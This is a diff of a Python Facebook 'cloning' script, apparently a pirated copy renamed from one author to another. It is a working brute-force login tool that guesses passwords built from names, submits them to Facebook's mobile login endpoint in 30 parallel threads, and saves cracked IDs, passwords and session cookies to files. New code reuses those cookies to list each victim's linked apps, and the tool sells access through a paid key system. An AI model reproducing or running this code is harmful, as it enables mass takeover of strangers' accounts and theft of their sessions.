@@ -1,4 +1,4 @@
-#-----------------[ MR-JUBAYER ]-------------------#
+#-----------------[ MR-AXL ]-------------------#
  
 import requests,bs4,json,os,sys,random,datetime,time,re
 import urllib3,rich,base64
@@ -15,7 +15,7 @@ from rich.text import Text as tekz
 from time import localtime as lt
 pretty.install()
 CON=sol()
- #------------------[ MR-JUBAYER ]-------------------#
+ #------------------[ MR-AXL ]-------------------#
 import os, platform, time, sys
 os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
 os.system('pip install httpx pip install beautifulsoup4')
@@ -36,7 +36,7 @@ time.sleep(2)
 time.sleep(2)
 
 ##os.system("espeak -a 300 \"Enter,Username,and,password, \"")##
-#------------------[ MR-JUBAYER ]-------------------#
+#------------------[ MR-AXL ]-------------------#
 #------------------[ USER-AGENT ]-------------------#
 ua = ["Mozilla/5.0 (Linux; Android 11; 2107113SI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.88 Mobile Safari/537.36",]
 ua = ["Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",]
@@ -1291,7 +1291,7 @@ cokbrut=[]
 ses=requests.Session()
 prinCP=[]
 try:
-    prox= requests.get('https://github.com/JUBAYER-420/CAYBAR.JUBAYER2.0/blob/main/Apruval.txt').text
+    prox= requests.get('https://github.com/AXL-420/CAYBAR.AXL2.0/blob/main/Apruval.txt').text
     open('.prox.txt','w').write(prox)
 except Exception as e:
     pass
@@ -1547,7 +1547,7 @@ pwpluss,pwnya=[],[]
  
  
 
-#------------[ JUBAYER- ]--------------#
+#------------[ AXL- ]--------------#
  
 P = '\x1b[1;97m'
 M = '\x1b[1;91m'
@@ -1605,7 +1605,7 @@ tgl = datetime.datetime.now().day
 bln = dic[(str(datetime.datetime.now().month))]
 thn = datetime.datetime.now().year
 okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
-CPc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
+cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
 date = str(tgl)+'/'+str(bln)+'/'+str(thn)
 ltx = int(lt()[3])
 if ltx > 12:
@@ -1616,7 +1616,7 @@ else:
     tag = "AM"
     def alvino_xy(u):
         for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
-def JUBAYERj(u):
+def AXLj(u):
         for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
 def clear():
 	os.system('clear')
@@ -1638,27 +1638,35 @@ def linex():
 def animation(u):
     for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
 logo ="""
-\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
-\033[0;91m┏┓┏┓┓┏┳┓┏┓┳┓  \033[0;94m┏┳┳┳┳┓┏┓┓┏┏┓┳┓┏┓ ┏┓
-\033[0;91m┃ ┣┫┗┫┣┫┣┫┣┫━━\033[0;94m┃┃┃┣┫┣┫┗┫┣ ┣┫┏┛ ┃┫
-\033[0;91m┗┛┛┗┗┛┻┛┛┗┛┗  \033[0;94m┗┛┗┛┻┛┛┗┗┛┗┛┛┗┗━•┗
-\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝                       
+
+\033[0;92m          
+\033[0;92m           ▄▄▄      ▒██   ██▒ ██▓    
+\033[0;92m          ▒████▄    ▒▒ █ █ ▒░▓██▒    
+\033[0;92m          ▒██  ▀█▄  ░░  █   ░▒██░    
+\033[0;92m          ░██▄▄▄▄██  ░ █ █ ▒ ▒██░    
+\033[0;92m           ▓█   ▓██▒▒██▒ ▒██▒░██████▒
+\033[0;92m           ▒▒   ▓▒█░▒▒ ░ ░▓ ░░ ▒░▓  ░
+\033[0;92m            ▒   ▒▒ ░░░   ░▒ ░░ ░ ▒  ░
+\033[0;92m            ░   ▒    ░    ░    ░ ░   
+\033[0;92m                ░  ░ ░    ░      ░  ░
+                     
 \033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
-╠══[Author                   • \33[1;38mJUBAYER-BRO ]\33[1;38m    ║\033[1;31m 
-╠══[Facebook                 • JUBAYER360       ║  \033[1;97m  
-╠══[Github                   • \33[1;38mJUBAYERmoulik008 ║\33[1;34m   
-╠══[Whatsapp                 • 01*********    ║\33[1;35m 
-╠══[TOOLS                    • Paid]         ║ \33[1;32m   
-╠══[VERSION                  • 1.2]           ║\033[1;35m 
+╠══[Author                   • \33[1;38mAXL    ║\033[1;31m 
+╠══[Facebook                 • AXL CHAN        ║  \033[1;97m  
+╠══[Github                   • \33[1;38mSECRET ║\33[1;34m   
+╠══[Whatsapp                 • 01*********     ║\33[1;35m 
+╠══[TOOLS                    • Paid            ║ \33[1;32m   
+╠══[VERSION                  • 1.2]            ║\033[1;35m 
 \033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m"""
 balpakna =("""\x1b[38;5;50m══════════════════════════════════════════════════""")    
 meyermarexudi =(""" \033[0;97m=============================================""")    
 alltimexudi =(""" \033[32;1m[-] ONLY APPROVAL SYSTEM 7 DEYS 200 TK 3 FOR    APPROVAL""")
-xudartimenai =(""" \033[32;1m[+] CONTACT ADMIN PLZ ENTAR""")
+xudartimenai =(""" \033[32;1m[+] TO CONTACT OWNER PLEASE ENTER""")
 fuckyoursali =(""" \033[32;1m[𝟷] 𝚈𝙾𝚄𝚁 𝚃𝙾𝙺𝙴𝙽 𝙸𝚂 𝚂𝚄𝙲𝙲𝙴𝚂𝚂𝙵𝚄𝙻𝙻𝚈 𝙰𝙿𝙿𝚁𝙾𝚅𝙴𝙳""")
-xudinaministar =(""" \033[38;1m[-] Importent Note """)
-hedaborakarent =(""" \033[35;1m[𝟸] 𝙵𝚄𝙲𝙺 𝙱𝚈𝙿𝙰𝚂𝙰𝚁 𝙲𝙷𝙰𝙺𝙴 𝚈𝙾𝚄𝚁 𝙳𝙰𝚃𝙰 ABAL😎 """)
-
+os.system('clear')
+xudinaministar =(""" \033[38;1m[-] Important Note """)
+hedaborakarent =(""" \033[35;1m[𝟸] Enjoy Cracking😎 """)
+os.system('clear')
                   #____APPROVAL SYSTEM ADD_____#
 def meyexudi():
   os.system('clear')
@@ -1678,51 +1686,53 @@ def meyexudi():
     else:
       print(meyermarexudi)
      # print(" \033[32;1m[+] Your Kay : "+id)
-      print(' \033[38;5;46m╔══[𝟷]💥  FREE-FIRE-TIK-TOK- ID CLONING')      
-      print(' \033[38;5;46m║══[𝟸]💥  ONLY ACTIVE ID CLONE 100%')
-      print(' \033[38;5;46m║══[𝟸]💥  CP ID WILL BE LOGIN 80%')
-      print(' \033[38;5;46m║══[𝟸]💥  WI-FI  AND DATA BOTH WORKING 100%')
-      print(' \033[38;5;46m║══[𝟸]💥  07 DAY 200 TAKA ')
-      print(' \033[38;5;46m║══[𝟸]💥  15 DAY 500 TAKA ')
-      os.system('espeak -a 300 " Hello,   Sir,  Assalamualaikum,   I,   Am,    Robot,   of,   MR,   JUBAYER,    Please,   Send,   Your,   Key,"')
+      os.system('espeak -a 300 " Hello,   Sir,   I,   Am,    Robot,   of,  AXL,    Please,   Send,   Your,   Key,"')
       print(" \x1b[0m║══[𝟸] YOUR KEY : "+id)
       input(' \033[1;30m╚══[𝟹] IF U WANT TO BUY THEN PRESS ENTER ')
-      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+8801798446097?text='+tks),approval()      
+      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://m.me/axczel.xhan?text='+tks),approval()      
       time.sleep(1)
       meyexudi()
   except:
     sys.exit()
 meyexudi()
-#os.system("python JUBAYER.py")
+#os.system("python AXL.py")
 def naima():
 	print('-------------------')
 print(logo)
-os.system('espeak -a 300 " Please,   Text,   Your,   Real,   Name,   Sir,"')
+os.system('espeak -a 300 " Please,   Enter,   Your,   Real,   Name,   Sir,"')
 uname =input('\033[1;91m[\033[1;91m•\033[1;91m]\033[1;33m WHAT IS YOUR NAME \033[1;91m: \33[1;31m')
-os.system('espeak -a 300 " Welcome,   to,  JUBAYER,BRO,  PAID,   Tools"')
+os.system('espeak -a 300 " Welcome,   to,  AXL,BRO,  PAID,   Tools"')
 def back():
 	login()
 	
 	import getpass
 
-attemps = 0
 
-while attemps < 12345677901:
-    username = input('\033[1;91m[\033[1;92m√\033[1;91m]\x1b[38;5;50m ENTER USERNAME: ')
-    password = input('\033[1;95m[\033[1;95m√\033[1;95m]\x1b[38;5;50m ENTER PASSWORD: ')
-
-    if username == 'EHC' and password == 'JUBAYER':
-        print(' \033[0;95mYou Have Successfully Logged in.')
-        os.system('espeak -a 300 " Successfully,   Log,  In,  Sir"')
-        break
+def check(session, coki):
+    w = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",
+                    cookies={"cookie": coki}).text
+    sop = BeautifulSoup(w, "html.parser")
+    x = sop.find("form", method="post")
+    game = [i.text for i in x.find_all("h3")]
+    if len(game) == 0:
+        pass
     else:
-        print(' Incorrect Pass Please Trying ')
-        attemps += 1
-        continue
-os.system('clear')
-pass
- 
- 
+        for gm in game:
+            print(f"\033[1;97m---\033[1;96m" +
+                  gm.replace('huwtn', ' hxw-code=hannan-33'))
+    w = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",
+                    cookies={"cookie": coki}).text
+    sop = BeautifulSoup(w, "html.parser")
+    x = sop.find("form", method="post")
+    game = [i.text for i in x.find_all("h3")]
+    if len(game) == 0:
+        pass
+    else:
+        for gm in game:
+            print(f"\033[1;97m---\033[1;93m" +
+                  gm.replace('riJan', 'Hxw-182^)Code=hannan-2233]'))
+
+
 def login():
     try:
         token = open('.token.txt','r').read()
@@ -1795,23 +1805,18 @@ def menu():
     print("\033[97;1m[\033[92;1m•\033[97;1m] \033[0;93mTODAY'S DATE :\033[1;96m "+date)
     print('\033[38;5;46m===============================================')
     print(f"""\033[38;5;46m[\033[92;1m1\033[91;1m] \033[0;91m𝗙𝗜𝗟𝗘 𝗖𝗟𝗢𝗡𝗜𝗡𝗚         """)
-    print("""\033[38;5;46m[\033[95;1m2\033[95;1m] \033[0;95m𝗖𝗢𝗡𝗧𝗔𝗖𝗧 ᏔᏆͲᎻ 𝗔𝗗𝗠𝗜𝗡""")
     print(f"""\033[38;5;46m[\033[93;1m3\033[93;1m] \033[93;1m𝗖𝗛𝗘𝗖𝗞 ϴᏦ 𝗜𝗗𝘇   """)
     print("""\033[38;5;46m[\033[98;1m0\033[98;1m] \033[0;98mᎬХᏆͲ""")
     print('\033[38;5;46m=================')
-    JUBAYER = input('\x1b\033[1;91m[\033[1;92m√\033[1;91m] \033[1;96mCHOOSE: ')
-    if JUBAYER in ['111']:
+    AXL = input('\x1b\033[1;91m[\033[1;92m√\033[1;91m] \033[1;96mCHOOSE: ')
+    if AXL in ['111']:
         login()
         dump_massal()
-    elif JUBAYER in ['1']:
+    elif AXL in ['1']:
         crack_file()
-    elif JUBAYER in ['2','02']:
-        os.system(
-            'xdg-open https://github.com/secre159/approval/blob/main/approved.txt')
-        os.system("python nono.py")
-    elif JUBAYER in ['3','03']:
+    elif AXL in ['3','03']:
         result()
-    elif JUBAYER in ['0']:
+    elif AXL in ['0']:
         os.system('rm -rf .token.txt')
         os.system('rm -rf .cookie.txt')
         print('\033[0;97m=================')
@@ -1998,8 +2003,8 @@ def dump_massal():
 def crack_file():
     print('\033[0;93m==================')
     os.system('espeak -a 300 " your file name"')
-    print('\033[1;36m[ Put File Example:  /sdcard/king.txt  Etc...]')
-    o = input('\033[95;1m[\033[92;1m+\033[95;1m] INPut FILE NAME :\033[95;1m ')
+    print('\033[1;36m[ Put File Example:  /sdcard/axl.txt  Etc...]')
+    o = input('\033[95;1m[\033[92;1m+\033[95;1m] INPUT FILE NAME :\033[95;1m ')
     try:lin = open(o).read().splitlines()
     except:
         print('\033[0;98m==================')
@@ -2014,8 +2019,8 @@ def crack_file():
  
 def setting():
     print('\033[0;91m=============================')
-    print("\033[95;1m[\033[95;1m1\033[95;1m] \033[0;95mCLONING FOR ONLY 𝐎𝐋𝐃 IDz")
-    print("\033[98;1m[\033[98;1m2\033[98;1m] \033[0;98mCLONING FOR ONLY 𝐍𝐄𝐖 IDz")
+    print("\033[95;1m[\033[95;1m1\033[95;1m] \033[0;95mCLONING FOR ONLY 𝐎𝐋𝐃 UID")
+    print("\033[98;1m[\033[98;1m2\033[98;1m] \033[0;98mCLONING FOR ONLY 𝐍𝐄𝐖 UID")
     print("\033[91;1m[\033[91;1m3\033[91;1m] \033[0;91mCLONING FOR 𝐌𝐈𝐗 IDz")
     print('\033[0;91m=============================')
     hu = input('\033[95;1m[\033[92;1m+\033[95;1m]CHOOSE :\033[95;1m ')
@@ -2041,7 +2046,7 @@ def setting():
             id2.insert(xx,bacot)
     print('\033[0;91m==================')
     print('\033[0;91m==================')
-    print("\033[98;1m[\033[98;1m1\033[98;1m] METHOD 1 [\035??𝐞𝐰 𝐕𝐞𝐫𝐬𝐢𝐨𝐧\033[1;37m]")
+    print("\033[98;1m[\033[98;1m1\033[98;1m] METHOD 1 [\035N𝐞𝐰 𝐕𝐞𝐫𝐬𝐢𝐨𝐧\033[1;37m]")
     print("\033[93;1m[\033[93;1m2\033[93;1m] METHOD 2 [\034𝐎𝐥𝐝 𝐕𝐞𝐫𝐬𝐢𝐨𝐧\033[1;37m]")
     print('\033[0;91m==================')
     hc = input('\033[95;1m[\033[92;1m•\033[95;1m] CHOOSE : ')
@@ -2060,13 +2065,12 @@ def setting():
 def passwrd():
     os.system('clear')
     print(logo)
-    print(f"\033[1;91m[\033[1;91m√\033[1;91m] \033[1;91m𝐘𝐎𝐔𝐑 𝐓𝐎𝐎𝐋𝐒 𝙰𝙲𝚃𝙸𝚅𝙴 \x1b[38;5;50m[𝙿𝚁𝙴𝙼𝙸𝚄𝙼] ")
-    print(f"\033[1;91m[\033[1;91m√\033[1;91m] \033[1;91m𝐔𝐒𝐄𝐑𝐒 𝐍𝐀𝐌𝐄\033[1;91m :\033[1;96m "+𝚞𝚗𝚊𝚖𝚎)
+    print(f"\033[1;91m[\033[1;91m√\033[1;91m] \033[1;91mTOOLS STATUS \x1b[38;5;50m[𝙿𝚁𝙴𝙼𝙸𝚄𝙼] ")
+    print(f"\033[1;91m[\033[1;91m√\033[1;91m] \033[1;91m𝐔𝐒𝐄𝐑 𝐍𝐀𝐌𝐄\033[1;91m :\033[1;96m "+𝚞𝚗𝚊𝚖𝚎)
     print("\033[1;91m[\033[1;92m√\033[1;91m] \033[1;95m𝗧𝗢𝗗𝗔𝗬'𝗦 𝙳𝙰𝚃𝙴 :\x1b[38;5;50m "+𝚍𝚊𝚝𝚎)
-    print('\033[1;91m[\033[1;92m√\033[1;91m] \033[1;93m𝚈𝙾𝚄𝚁 TOTAL 𝙸𝙳𝚣 \033[0;97m:\x1b[38;5;50m ',str(len(id)))
-    print("\033[1;91m[\033[1;92m√\033[1;91m] \033[1;95m𝗦𝗧𝗔𝗥𝗧𝗘𝗗 𝗬𝗢𝗨𝗥 𝗖𝗟𝗢𝗡𝗜𝗡𝗚 𝗧𝗜𝗠𝗘 \033[0;97m :> \x1b[38;5;50m"+time.strftime("%H:%M")+" "+ tag)
-    print("\033[1;91m[\033[1;92m√\033[1;91m] \033[1;91m𝐂𝐋𝐎𝐍𝐈𝐍𝐆 𝐒𝐏𝐄𝐄𝐃 𝐒𝐔𝐏𝐄𝐑 𝐅𝐀𝐒𝐓 ⏩")
-    print(f'\033[1;91m[\033[1;92m√\033[1;91m] \033[1;98m𝐔𝐒𝐄=[𝐅𝐋𝐈𝐆𝐇𝐓 𝐌𝐎𝐃𝐄 𝙵𝙾𝚁 𝚂𝙿𝙴𝙴𝙳 𝚄𝙿💙] ')
+    print('\033[1;91m[\033[1;92m√\033[1;91m] \033[1;93m𝚈𝙾𝚄𝚁 TOTAL 𝙸𝙳 \033[0;97m:\x1b[38;5;50m ',str(len(id)))
+    print("\033[1;91m[\033[1;92m√\033[1;91m] \033[1;95mTIME CLONING STARTED \033[0;97m :> \x1b[38;5;50m"+time.strftime("%H:%M")+" "+ tag)
+    print(f'\033[1;91m[\033[1;92m√\033[1;91m] \033[1;98m𝐔𝐒𝐄=[𝐅𝐋𝐈𝐆𝐇𝐓 𝐌𝐎𝐃𝐄 EVERY 3 MINS] ')
     print('\x1b[38;5;50m===============================================')
     with tred(max_workers=30) as pool:
         for yuzong in id2:
@@ -2113,7 +2117,6 @@ def passwrd():
                     pwv.append(frs+'ganda')
                     pwv.append(frs+'pogi')
                     pwv.append(frs+'cute')
-                   
                              
             else:
                 if len(frs)<3:
@@ -2170,14 +2173,14 @@ def passwrd():
     print('\033[97;1m[\033[92;1m+\033[96;1m] CP :\033[0;93m %s '%(cp))
     print('\n\033[1;37m===================================')
     woi = input('\033[97;1m[\033[92;1m+\033[95;1m] \033[1;37m ENTER TO BACK')
-    os.system("python nono.py")
+    os.system("python axl.py")
     exit() 
 #--------------------[ METODE-B-API ]-----------------#
  
 def crack(idf,pwv):
     global loop,ok,cp
     bo = random.choice([m,k,h,b,u,x])
-    sys.stdout.write(f"\r\033[100;95m{bo}[JUBAYER 🔍•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
+    sys.stdout.write(f"\r\033[100;95m{bo}[AXL 🔍•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
     sys.stdout.flush()
     ua = random.choice(ugen)
     ua2 = random.choice(ugen2)
@@ -2194,19 +2197,27 @@ def crack(idf,pwv):
             heade = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
             po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
             if "checkpoint" in po.cookies.get_dict().keys():
-                print(f'\r\033[38;5;46m[JUBAYER-Cp🌺]✅Uid┏━➤ {idf} 🔑Pass┏━➤{pw}')
+                print(
+                    f'\r\033[38;5;46m[{time.strftime("%H:%M")}•AXL-Cp] ✅Uid┏━➤ {idf} \n🔑Pass┏━➤')
                 os.system('espeak -a 300 " Sorry,  You,  Have,  Got,  Cp,  Id"')
-                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
+                with open('/sdcard/DEAD-ID' + cpc, 'a') as file:
+                    file.write(f"{idf} • {pw}\n\n")
+
                 akun.append(idf+' • '+pw)
-                cp+=1
+                cp += 1
                 break
             elif "c_user" in ses.cookies.get_dict().keys():
-                ok+=1
-                coki=po.cookies.get_dict()
-                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print(f'\r\033[38;5;46m[JUBAYER-Ok🌸] ✅Uid┏━➤ {idf} 🔑Pass┏━➤ {pw}\n\033[0;91m[🌼]= COOKIES • \033[0;91m{kuki} ')
-                os.system('espeak -a 300 " Congratulation,  You,  Have,  Got,  Ok,  id"')
-                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
+                ok += 1
+                coki = po.cookies.get_dict()
+                kuki = (";").join(["%s=%s" % (key, value)
+                                   for key, value in ses.cookies.get_dict().items()])
+                print(
+                    f'\r\033[38;5;46m[{time.strftime("%H:%M")}•AXL-Ok] ✅Uid┏━➤ {idf} \n🔑Pass┏━➤')
+                os.system(
+                    'espeak -a 300 " Congratulation,  You,  Have,  Got,  Ok,  id"')
+                with open('/sdcard/ALIVE-ID' + okc, 'a') as file:
+                    file.write(f"{idf} • {pw} • Cookies: {kuki}\n\n")
+                    check(ses, coki)
                 break
                 
             else:
@@ -2219,7 +2230,7 @@ def crack(idf,pwv):
  
 def crackfree(idf,pwv):
     global loop,ok,cp
-    sys.stdout.write(f"\r{H}[JUBAYER 🔍-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
+    sys.stdout.write(f"\r{H}[AXL 🔍-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
     sys.stdout.flush()
     ua = random.choice(ugen)
     ua2 = random.choice(ugen2)
@@ -2236,9 +2247,11 @@ def crackfree(idf,pwv):
             heade = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
             po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
             if "checkpoint" in po.cookies.get_dict().keys():
-                print(f'\r\033[38;5;46m[{time.strftime("%H:%M")}•JUBAYER-Cp] ✅Uid┏━➤ {idf} 🔑Pass┏━➤')
-                os.system('espeak -a 300 " Sorry,  You,  Have,  Got,  Cp,  Id"')
-                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
+                print(f'\r\033[38;5;46m[{time.strftime("%H:%M")}•AXL-Cp] ✅Uid┏━➤ {idf} \n🔑Pass┏━➤')
+                os.system('espeak -a 300 " Sorry,  You,  Got,  Dead,  Id"')
+                with open('/sdcard/DEAD-ID' + cpc, 'a') as file:
+                    file.write(f"{idf} • {pw}\n\n")
+
                 akun.append(idf+' • '+pw)
                 cp+=1
                 break
@@ -2246,9 +2259,12 @@ def crackfree(idf,pwv):
                 ok+=1
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print(f'\r\033[38;5;46m[{time.strftime("%H:%M")}•JUBAYER-Ok] ✅Uid┏━➤ {idf} 🔑Pass┏━➤')
-                os.system('espeak -a 300 " Congratulation,  You,  Have,  Got,  Ok,  id"')
-                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
+                print(f'\r\033[38;5;46m[{time.strftime("%H:%M")}•AXL-Ok] ✅Uid┏━➤ {idf} \n🔑Pass┏━➤')
+                os.system('espeak -a 300 " Congratulation,  You,  Got,  Alive,  id"')
+                with open('/sdcard/ALIVE-ID' + okc, 'a') as file:
+                    file.write(f"{idf} • {pw} • Cookies: {kuki}\n\n")
+                    check(ses, coki)
+
                 break
                 
             else:
